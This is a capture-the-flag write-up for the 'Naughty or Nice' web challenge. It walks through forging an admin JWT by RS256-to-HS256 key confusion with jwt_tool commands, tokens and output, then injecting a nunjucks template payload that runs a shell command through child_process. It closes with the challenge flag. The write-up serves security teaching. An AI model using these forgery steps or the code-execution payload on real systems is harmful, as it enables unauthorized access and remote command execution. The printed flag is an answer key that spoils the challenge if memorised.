# Naughty or Nice (325)

## Problem

> All the Santa's nice elves have been added to the naughty list by the wicked elves and Santa is mad! He asked you to hack into the admin account of the Naughty or Nice portal and retrieve the magic flag that will let Santa finally banish the evil elves from the north pole!

* [web_naughty_or_nice.zip](./web_naughty_or_nice.zip)

## Solution

1. Looking at the source code we see that in the `challenge/helpers/JWTHelper.js` file, both the "RS256" and "HS256" algorithms are allowed for decryption. This is CVE-2016-5431/CVE-2016-10555.

2. The HS256 algorithm is symmetric, which means it uses the sane secret key to sign and verify each message. The RS256 algorithm is asymmetric, which means it uses a private key to sign the message and a public key for verification. However, if we change the algorithm from RS256 to HS256, the backend code will use the public key as the symmetric secret key. In other words, the HS256 algorithm will be used to verify the signature with the public key as the HS256 secret key. We know the public key so we can, in theory, easily modify the JWT and sign it.

3. However, before we can do this we need to get the JWT token and get the public key. So, make an account on the website, open up your browser's cookie page in the developer tools, and copy the `session` cookie. We can use [JWT.io](https://jwt.io/) or [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) to decode the cookie. `python3 jwt_tool.py "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTNuWlpMWHB3R3prVXM0N1J6UkRpXG5idkNFZzFFcllrcC9LWk1hclVqZTVWRGljdDlzMXhFVkM1aXFvVmJ2U0Vkd0hoN3J0M0p1aUZIKzBPVTlWY0JUXG4rVHd3VHM3Y2toRG8rczFUVjhHV0RkWFFrb0l1dHRaak5DUUo2TG0zQ3ZlbEtJWW1jSUtwdlBCblRlRlJkMVh6XG5xUmdldnE2SlZSQ1lyeVFYMXhtckVQOVc5OFpWWGJQcE9GOTRHUWlpRU1RdWJNMGlMakdjVEFqRldVdXFaZlU3XG5iMWpDV1lIb1A4UWV6dmNBK1FCUndXN2dubHpCYVVCRmVNN3Y4Smw3cCtGVXFtQnI5VitOa2htMDV0L0ZraU95XG55dVgwa0FFcDFKNzRRZXRMSXg0d0tmbjBIZjZXeUp0ejB2ZnV6YkJETWh2VDZyZXBtSXpCVW9ycHh6bk5UVForXG5xd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tIiwiaWF0IjoxNjM4NzMxMzQ3fQ.bnjglGFat38YIylfRdN-AubHq7FIpPgrISj3rGlVUJti_8ORBgF6alQDyEr742vUYaFaaONnhUlgSKyurANLKI1fNpAZCp0loN5D_mSk8B8PMSNArghxLB1P_2g36pd7ZWE8GQPFF2582fOYCK1zJreMKPozXGe3fjBNB6nqrNk21ReFQsPpuLfPM8HgK3jPXgyN5mN4HKMsLgObrA-5W3IhWglV64BHuNbpki5x0OGMedxTEtzuYqAhQbkOhz7x_GLI8c04lyJSY9dYVaNSsmU84gZJZ-5Hmk4GlQTtRwrV_OnSVxampPUk8MhIIeLHhUOiaWrRtmLbxiV1EaPK6g"`:

    ```
    =====================
    Decoded Token Values:
    =====================

    Token header values:
    [+] alg = "RS256"
    [+] typ = "JWT"

    Token payload values:
    [+] username = "test"
    [+] pk = "-----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3nZZLXpwGzkUs47RzRDi
    bvCEg1ErYkp/KZMarUje5VDict9s1xEVC5iqoVbvSEdwHh7rt3JuiFH+0OU9VcBT
    +TwwTs7ckhDo+s1TV8GWDdXQkoIuttZjNCQJ6Lm3CvelKIYmcIKpvPBnTeFRd1Xz
    qRgevq6JVRCYryQX1xmrEP9W98ZVXbPpOF94GQiiEMQubM0iLjGcTAjFWUuqZfU7
    b1jCWYHoP8QezvcA+QBRwW7gnlzBaUBFeM7v8Jl7p+FUqmBr9V+Nkhm05t/FkiOy
    yuX0kAEp1J74QetLIx4wKfn0Hf6WyJtz0vfuzbBDMhvT6repmIzBUorpxznNTTZ+
    qwIDAQAB
    -----END PUBLIC KEY-----"
    [+] iat = 1638731347    ==> TIMESTAMP = 2021-12-05 14:09:07 (UTC)

    ----------------------
    JWT common timestamps:
    iat = IssuedAt
    exp = Expires
    nbf = NotBefore
    ----------------------
    ```

4. Fortunately for us, the public key is encoded in the JWT. So, to get access to the `/api/elf/edit` and `/api/elf/list` endpoints, we need to tamper with this token to change the `username` to "admin" using the RS256-to-HS256 exploit.

5. There are an abundance of ways that you can perform the RS256-to-HS256 exploit: [3v4Si0N/RS256-2-HS256](https://github.com/3v4Si0N/RS256-2-HS256), [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool), manually via [JWT.io](https://jwt.io/), by running the commands in [this excellent guide](https://habr.com/en/post/450054/). However, you have to be very careful about newlines in the public key. I tried all of these methods with about every option possible, but I found that running this command actually worked: `python3 jwt_tool.py -T "{JWT HERE}" -S hs256 -p "{PUBLIC KEY HERE}"`. (Alternatively, see [Alternative JWT Decoding Steps](#alternative-jwt-decoding-steps) for an approach using [JWT.io](https://jwt.io/).) So, with the key that would look like this:

    ```
    python3 jwt_tool.py -T "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTNuWlpMWHB3R3prVXM0N1J6UkRpXG5idkNFZzFFcllrcC9LWk1hclVqZTVWRGljdDlzMXhFVkM1aXFvVmJ2U0Vkd0hoN3J0M0p1aUZIKzBPVTlWY0JUXG4rVHd3VHM3Y2toRG8rczFUVjhHV0RkWFFrb0l1dHRaak5DUUo2TG0zQ3ZlbEtJWW1jSUtwdlBCblRlRlJkMVh6XG5xUmdldnE2SlZSQ1lyeVFYMXhtckVQOVc5OFpWWGJQcE9GOTRHUWlpRU1RdWJNMGlMakdjVEFqRldVdXFaZlU3XG5iMWpDV1lIb1A4UWV6dmNBK1FCUndXN2dubHpCYVVCRmVNN3Y4Smw3cCtGVXFtQnI5VitOa2htMDV0L0ZraU95XG55dVgwa0FFcDFKNzRRZXRMSXg0d0tmbjBIZjZXeUp0ejB2ZnV6YkJETWh2VDZyZXBtSXpCVW9ycHh6bk5UVForXG5xd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tIiwiaWF0IjoxNjM4NzMxMzQ3fQ.bnjglGFat38YIylfRdN-AubHq7FIpPgrISj3rGlVUJti_8ORBgF6alQDyEr742vUYaFaaONnhUlgSKyurANLKI1fNpAZCp0loN5D_mSk8B8PMSNArghxLB1P_2g36pd7ZWE8GQPFF2582fOYCK1zJreMKPozXGe3fjBNB6nqrNk21ReFQsPpuLfPM8HgK3jPXgyN5mN4HKMsLgObrA-5W3IhWglV64BHuNbpki5x0OGMedxTEtzuYqAhQbkOhz7x_GLI8c04lyJSY9dYVaNSsmU84gZJZ-5Hmk4GlQTtRwrV_OnSVxampPUk8MhIIeLHhUOiaWrRtmLbxiV1EaPK6g" -S hs256 -p "-----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3nZZLXpwGzkUs47RzRDi
    bvCEg1ErYkp/KZMarUje5VDict9s1xEVC5iqoVbvSEdwHh7rt3JuiFH+0OU9VcBT
    +TwwTs7ckhDo+s1TV8GWDdXQkoIuttZjNCQJ6Lm3CvelKIYmcIKpvPBnTeFRd1Xz
    qRgevq6JVRCYryQX1xmrEP9W98ZVXbPpOF94GQiiEMQubM0iLjGcTAjFWUuqZfU7
    b1jCWYHoP8QezvcA+QBRwW7gnlzBaUBFeM7v8Jl7p+FUqmBr9V+Nkhm05t/FkiOy
    yuX0kAEp1J74QetLIx4wKfn0Hf6WyJtz0vfuzbBDMhvT6repmIzBUorpxznNTTZ+
    qwIDAQAB
    -----END PUBLIC KEY-----"
    ```

    It's a pretty ugly command. You should be able to copy and paste the public key into a file called `key.pub` and then do something like `python3 jwt_tool.py -X k -pk key.pub -pc username -pv admin` (`-X` tells jwt_tool.py to use the key confustion exploit, which is what we want, and `-pk` tells it what key to use), but this didn't work for me. Also, [the aforementioned guide](https://habr.com/en/post/450054/) should work too, but they both genereate invalid tokens. I'm not sure what I'm missing to get those tools working. By the way, [3v4Si0N/RS256-2-HS256](https://github.com/3v4Si0N/RS256-2-HS256) is an automated version of [the aforementioned guide](https://habr.com/en/post/450054/).

    The output of this command has the tampered token, which is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEzblpaTFhwd0d6a1VzNDdSelJEaVxuYnZDRWcxRXJZa3AvS1pNYXJVamU1VkRpY3Q5czF4RVZDNWlxb1ZidlNFZHdIaDdydDNKdWlGSCswT1U5VmNCVFxuK1R3d1RzN2NraERvK3MxVFY4R1dEZFhRa29JdXR0WmpOQ1FKNkxtM0N2ZWxLSVltY0lLcHZQQm5UZUZSZDFYelxucVJnZXZxNkpWUkNZcnlRWDF4bXJFUDlXOThaVlhiUHBPRjk0R1FpaUVNUXViTTBpTGpHY1RBakZXVXVxWmZVN1xuYjFqQ1dZSG9QOFFlenZjQStRQlJ3Vzdnbmx6QmFVQkZlTTd2OEpsN3ArRlVxbUJyOVYrTmtobTA1dC9Ga2lPeVxueXVYMGtBRXAxSjc0UWV0TEl4NHdLZm4wSGY2V3lKdHowdmZ1emJCRE1odlQ2cmVwbUl6QlVvcnB4em5OVFRaK1xucXdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODczMTM0N30.Eo4x1pdGAmIyQTZhCl7kUkuSxiCZvmAPU1G2s5i9erY`.

6. Anyway, once you have the tampered token, swap it out with the non-admin token in your browser's developer tools. Now, we can access the admin dashboard and the `/api/elf/edit` and `/api/elf/list` endpoints.

7. Back in the source code, if we look at the `challenge/routes/index.js` file we see that the `/` endpoint uses the `CardHelper` class to generate the card with a list of the elf's names. Since we are now an admin, we can edit the names of these elfs, and thus we control this value. Looking at `challenge/helpers/CardHelper.js`, we notice that the `nunjucks` templating engine is used and that we can contol what is passed to a `nunjucks` template. Thus, this is a `nunjucks` SSTI (Server-Side Template Injection).

8. Searching for "nunjucks ssti" reveals [this great guide](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine) about breaking out of the `nunjucks` templating engine. We can run `{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag*')")()}}` to print the contents of the `/flag` file. We determined that this is where the flag is by looking at the `Dockerfile` in the challenge ZIP. The `flag` file is copied to `/flag` within the container.

9. So, in the admin dashboard, we copy and paste out payload `{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag*')")()}}` into one off the elf's name field, submit the changes, and then we navigate back to the home page, `/`, and there's the flag. You can view the source of this page to make copy and pasting the flag easier.

### Alternative JWT Decoding Steps

1. Get a JWT token from the application by signing into any account and paste it into [JWT.io](https://jwt.io/).

2. Copy the public key and make sure that there is no new line at the end. I got this public key from [JWT.io](https://jwt.io/): `-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3nZZLXpwGzkUs47RzRDi\nbvCEg1ErYkp/KZMarUje5VDict9s1xEVC5iqoVbvSEdwHh7rt3JuiFH+0OU9VcBT\n+TwwTs7ckhDo+s1TV8GWDdXQkoIuttZjNCQJ6Lm3CvelKIYmcIKpvPBnTeFRd1Xz\nqRgevq6JVRCYryQX1xmrEP9W98ZVXbPpOF94GQiiEMQubM0iLjGcTAjFWUuqZfU7\nb1jCWYHoP8QezvcA+QBRwW7gnlzBaUBFeM7v8Jl7p+FUqmBr9V+Nkhm05t/FkiOy\nyuX0kAEp1J74QetLIx4wKfn0Hf6WyJtz0vfuzbBDMhvT6repmIzBUorpxznNTTZ+\nqwIDAQAB\n-----END PUBLIC KEY-----`.

3. Base64 encode the public key with `echo -en "public key" | base64`. We use the `-e` and `-n` flags with `echo` to tell it to intepret escape sequences and to not output a newline at the end.

    Command:

    ```bash
    echo -en "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3nZZLXpwGzkUs47RzRDi\nbvCEg1ErYkp/KZMarUje5VDict9s1xEVC5iqoVbvSEdwHh7rt3JuiFH+0OU9VcBT\n+TwwTs7ckhDo+s1TV8GWDdXQkoIuttZjNCQJ6Lm3CvelKIYmcIKpvPBnTeFRd1Xz\nqRgevq6JVRCYryQX1xmrEP9W98ZVXbPpOF94GQiiEMQubM0iLjGcTAjFWUuqZfU7\nb1jCWYHoP8QezvcA+QBRwW7gnlzBaUBFeM7v8Jl7p+FUqmBr9V+Nkhm05t/FkiOy\nyuX0kAEp1J74QetLIx4wKfn0Hf6WyJtz0vfuzbBDMhvT6repmIzBUorpxznNTTZ+\nqwIDAQAB\n-----END PUBLIC KEY-----" | base64
    ```

    Output:

    ```
    LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FR
    OEFNSUlCQ2dLQ0FRRUEzblpaTFhwd0d6a1VzNDdSelJEaQpidkNFZzFFcllrcC9LWk1hclVqZTVW
    RGljdDlzMXhFVkM1aXFvVmJ2U0Vkd0hoN3J0M0p1aUZIKzBPVTlWY0JUCitUd3dUczdja2hEbytz
    MVRWOEdXRGRYUWtvSXV0dFpqTkNRSjZMbTNDdmVsS0lZbWNJS3B2UEJuVGVGUmQxWHoKcVJnZXZx
    NkpWUkNZcnlRWDF4bXJFUDlXOThaVlhiUHBPRjk0R1FpaUVNUXViTTBpTGpHY1RBakZXVXVxWmZV
    NwpiMWpDV1lIb1A4UWV6dmNBK1FCUndXN2dubHpCYVVCRmVNN3Y4Smw3cCtGVXFtQnI5VitOa2ht
    MDV0L0ZraU95Cnl1WDBrQUVwMUo3NFFldExJeDR3S2ZuMEhmNld5SnR6MHZmdXpiQkRNaHZUNnJl
    cG1JekJVb3JweHpuTlRUWisKcXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t
    ```

4. Paste the JWT into [JWT.io](https://jwt.io/) again. Then, change change the algorithm to "HS256" and change the `username` field to "admin". Next, paste the base64 encoded key into the "your-256-bit-secret" field. Check the "secret base64 encoded" box, and now you should have your tampered JWT.

### Flag

`HTB{S4nt4_g0t_ninety9_pr0bl3ms_but_chr1stm4s_4in7_0n3}`
